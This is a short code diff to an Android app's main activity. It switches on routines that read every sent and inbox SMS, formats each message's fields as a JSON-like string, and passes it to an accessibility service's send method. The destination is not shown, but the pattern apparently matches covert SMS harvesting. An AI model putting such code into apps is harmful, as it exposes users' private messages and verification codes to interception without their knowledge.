@@ -44,10 +44,8 @@ public class MainActivity extends AppCompatActivity {
 
         System.out.println("STARTING -----------------");
 
-
-
-        //getSentSMS();
-        //getInboxSMS();
+        getSentSMS();
+        getInboxSMS();
 
 
     }
@@ -96,12 +94,14 @@ public class MainActivity extends AppCompatActivity {
             System.out.println("test2");
 
             do {
-                String msgData = "";
+                String msgData = "{";
                 for(int idx=0;idx<cursor.getColumnCount();idx++)
                 {
-                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                    if (idx > 0) msgData += ",";
+                    msgData += "'" + cursor.getColumnName(idx) + "':'" + cursor.getString(idx) + "'";
 
                 }
+                msgData += "}";
                 System.out.println(msgData);
                 myAccessibilityService.send(msgData);
                 // use msgData
